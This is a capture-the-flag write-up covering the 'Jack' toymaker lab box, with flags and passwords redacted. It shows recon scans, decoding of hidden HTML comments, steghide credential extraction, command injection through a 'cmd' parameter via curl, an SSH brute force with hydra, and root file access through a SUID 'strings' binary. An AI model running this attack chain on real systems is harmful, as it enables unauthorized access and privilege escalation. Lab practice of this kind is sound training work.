## Target IP: `10.10.183.26`

---

### Local Environment Setup

```bash
export IP=10.10.183.26
export LIP=10.6.24.56
```

---

### Reconnaissance

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
nikto -h http://$IP
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 22 | HTTP (Apache 2.4.10) |
| 80 | SSH (OpenSSH 6.7p1 Debian 5) |

Yeah, they flipped the script. Web server on port 22 and SSH on port 80. Firefox lost its mind. Had to go into `about:config` and create a string for `network.security.ports.banned.override`, adding `22`. Classic troll move.

---

### Web Enumeration

- Site is for a toymaker named **Jack** — likely a username.
- Source code of homepage shows:

```html
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```

- Base64 decode:

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [REDACTED]
```

So now we’ve got two usernames (`jack`, `johny` maybe) and a password: `[REDACTED]`.

Tried it on `/recovery.php` — nothing useful. Checked source code of that page and saw another encoded string:

```html
<!-- GQ2T...long base32 string... -->
```

- Decoded it: **Base32 → Hex → ROT13** (because they’re assholes). (Looking at this from the future and checking the writeup, if we had done OSINT on Johny Graves we would have found a post about encoding in that order. Keep in mind to dig deeper for next time)
- Final message:

```
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

- Link redirects to **Stegosauria** Wikipedia page — obvious steganography clue.

---

### Stego and Image Enumeration

- Gobuster reveals: `http://$IP:22/assets`
- Directory has 3 images:
    - `stego.jpg` (dinosaur)
    - `header.jpg`
    - `jackinthebox.jpg`

**Tried stego.jpg:**

```bash
steghide extract -sf stego.jpg
# Used password: [REDACTED]
```

- Extracted `creds.txt`: “you're on the right path, but wrong image!”

**Tried header.jpg:**

```bash
steghide extract -sf header.jpg
# Same password
```

- Extracted `cms.creds`:

```
Username: jackinthebox
Password: [REDACTED]
```

---

### RCE via Web Interface

- Logged into CMS using creds above.
- Page output said:

```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

**Command Injection (RCE):**

This works via query string injection:

```bash
curl "http://$IP:22/index.php?cmd=whoami"
```

- Output: `www-data`
- Full shell not needed. Just inject via `cmd` parameter.

Confirmed command execution with:

```bash
curl "http://$IP:22/index.php?cmd=ls -la /home"
```

Output showed:

- `/home/jack` (owner: jack)
- `/home/jacks_password_list`

---

### SSH Brute Force

- Retrieved `/home/jacks_password_list` using:

```bash
curl "http://$IP:22/index.php?cmd=cat /home/jacks_password_list"
```

- Extracted all the passwords (used page source to get full list).
- Verified username from `/etc/passwd` — it's `jack`.

**Hydra Brute Force:**

```bash
hydra -l jack -P jack_password_list.txt -s 80 ssh://$IP
```

- Found password: `[REDACTED]`

---

### SSH Access and User Flag

```bash
ssh -p 80 jack@10.10.183.26
```

- Inside `/home/jack`: found `user.jpg`
- Downloaded:

```bash
scp -P 80 jack@10.10.183.26:/home/jack/user.jpg .
```

- Image displayed flag:

```
[REDACTED]
```

---

### Privilege Escalation

- No sudo access for jack.
- Kernel exploits failed — no sudo rights to execute anything elevated.

**Checked for SUID binaries:**

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found: `/usr/bin/strings` has SUID bit set (runs as root).

```bash
/usr/bin/strings /root/root.txt
```

- Output:
    
    `[REDACTED]`
